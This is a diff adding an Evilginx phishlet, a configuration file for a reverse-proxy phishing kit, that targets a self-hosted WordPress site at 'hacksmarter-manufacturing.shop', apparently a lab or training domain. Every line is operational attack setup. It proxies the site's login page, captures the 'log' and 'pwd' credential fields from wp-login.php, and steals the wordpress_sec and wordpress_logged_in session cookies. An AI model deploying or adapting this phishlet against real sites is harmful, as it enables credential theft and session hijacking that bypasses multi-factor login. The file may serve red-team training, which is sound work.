@@ -1,0 +1,37 @@
+# Evilginx phishlet configuration file for hacksmarter-manufacturing.shop (self-hosted WordPress)
+---
+name: 'HackSmarterWordPress'
+author: '@tyler'
+min_ver: '2.3.0'
+
+proxy_hosts:
+  - phish_sub: ''
+    orig_sub: ''
+    domain: 'hacksmarter-manufacturing.shop'
+    session: true
+    is_landing: true
+
+sub_filters: []
+
+auth_tokens:
+  - domain: 'hacksmarter-manufacturing.shop'
+    keys:
+      - 'wordpress_sec_.*,regexp'
+      - 'wordpress_logged_in_.*,regexp'
+
+auth_urls:
+  - '.*/wp-admin/.*'
+
+credentials:
+  username:
+    key: 'log'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'pwd'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'hacksmarter-manufacturing.shop'
+  path: '/wp-login.php'
